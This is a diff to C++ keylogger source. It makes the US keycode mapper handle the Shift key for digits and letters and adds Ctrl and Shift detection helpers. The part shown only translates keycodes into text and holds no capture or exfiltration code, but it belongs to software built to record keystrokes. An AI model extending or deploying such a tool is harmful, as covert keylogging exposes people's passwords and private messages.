@@ -4,7 +4,9 @@
 
 namespace Keylogger {
 
-std::string KeycodeMapperUS::keycodeToStr(int keycode) {
+char shiftNum[] = ")!@#$%^&*(";
+
+std::string KeycodeMapperUS::keycodeToStr(int keycode, bool modifierShift) {
     switch (keycode) {
     case VK_BACK:
         return "BKSP";
@@ -64,6 +66,7 @@ std::string KeycodeMapperUS::keycodeToStr(int keycode) {
     case '7':
     case '8':
     case '9':
+        return std::string(1, modifierShift ? shiftNum[keycode - '0'] : keycode);
     case 'A':
     case 'B':
     case 'C':
@@ -90,7 +93,7 @@ std::string KeycodeMapperUS::keycodeToStr(int keycode) {
     case 'X':
     case 'Y':
     case 'Z':
-        return std::string(1, keycode);
+        return std::string(1, modifierShift ? keycode : keycode - 'A' + 'a');
     case VK_LWIN:
     case VK_RWIN:
         return "WIN";
@@ -195,6 +198,14 @@ bool KeycodeMapperUS::isShiftConsumed(int keycode) {
 
 bool KeycodeMapperUS::isModifier(int keycode) {
     return false;
+}
+
+bool KeycodeMapperUS::isCtrl(int keycode) {
+    return keycode == VK_CONTROL || keycode == VK_LCONTROL || keycode == VK_RCONTROL;
+}
+
+bool KeycodeMapperUS::isShift(int keycode) {
+    return keycode == VK_SHIFT || keycode == VK_LSHIFT || keycode == VK_RSHIFT;
 }
 
 }
